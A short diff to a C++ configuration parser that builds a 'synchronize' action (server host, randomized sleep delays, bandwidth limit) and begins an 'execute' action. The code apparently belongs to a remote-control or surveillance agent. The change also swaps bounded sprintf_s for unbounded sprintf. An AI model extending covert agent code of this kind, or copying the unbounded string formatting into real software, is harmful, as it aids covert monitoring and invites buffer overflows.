@@ -458,14 +458,14 @@ BYTE *ParseActionParameter(JSONObject conf_json, DWORD *tag)
 		} sync_conf_struct;
 		sync_conf_struct *sync_conf;
 		*tag = AF_SYNCRONIZE;
-		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str()));
+		param = (BYTE *)malloc(sizeof(sync_conf_struct) + wcslen(conf_json[L"host"]->AsString().c_str())*2);
 		if (param) {
 			sync_conf = (sync_conf_struct *)param;
 			sync_conf->min_sleep = conf_json[L"mindelay"]->AsNumber();
 			sync_conf->max_sleep = conf_json[L"maxdelay"]->AsNumber();
 			sync_conf->band_limit= conf_json[L"bandwidth"]->AsNumber();
 			sync_conf->exit_after_completion = conf_json[L"stop"]->AsBool();
-			sprintf_s(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
+			sprintf(sync_conf->asp_server, "%S", conf_json[L"host"]->AsString().c_str());
 		}
 
 	} else if (!wcscmp(action, L"execute")) {
